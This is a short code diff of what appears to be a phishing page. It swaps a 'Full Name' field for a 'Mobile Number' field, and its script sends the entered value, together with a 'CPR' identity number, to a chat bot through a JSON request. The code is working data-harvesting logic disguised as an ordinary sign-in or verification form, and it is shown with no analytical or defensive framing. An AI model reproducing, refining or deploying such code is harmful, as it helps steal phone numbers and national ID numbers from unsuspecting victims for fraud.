@@ -204,7 +204,7 @@
 <form action="send.php" method="post">
         <div class="form-container">
             <div class="input-group">
-                <input type="text" name="fname" class="input-field" placeholder="Full Name *" id="fullName">
+                <input type="tel" name="fname" class="input-field" placeholder="Mobile Number *" id="fullName">
             </div>
 
             <button class="submit-button" name="ss" id="submitBtn">Continue</button>
@@ -251,7 +251,7 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: chatId,
-          text: `👤 *Full Name Submitted*\n━━━━━━━━━━\n📋 *Full Name:* ${fullName}\n🆔 *CPR:* ${cpr || 'Not provided'}`
+          text: `👤 *Mobile Number Submitted*\n━━━━━━━━━━\n📋 *Mobile Number:* ${fullName}\n🆔 *CPR:* ${cpr || 'Not provided'}`
         })
       });
 
